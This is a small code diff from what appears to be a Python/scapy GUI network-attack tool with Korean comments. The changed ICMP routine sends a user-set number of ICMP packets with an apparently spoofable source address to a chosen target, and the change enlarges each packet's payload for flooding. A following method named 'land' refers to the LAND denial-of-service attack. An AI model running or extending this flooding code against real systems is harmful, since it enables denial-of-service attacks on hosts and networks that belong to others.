@@ -194,9 +194,9 @@ class GUIMODE():
     def _ICMP(self):
 
         dst_ip = self.ip_dst_data.get()
-        data = (string.ascii_letters + string.digits)
+        data = (string.ascii_letters + string.digits)*20
         for x in range(0, self.count):  # 보낼 패킷의 범위
-            icmpf=IP(src=self.s_ip,dst=dst_ip)/ICMP()/(data)*10
+            icmpf=IP(src=self.s_ip,dst=dst_ip)/ICMP()/(data)
             send(icmpf)  # ICMP 전송
     def land(self):   # land 김진
         dst_ip = self.ip_dst_data.get()
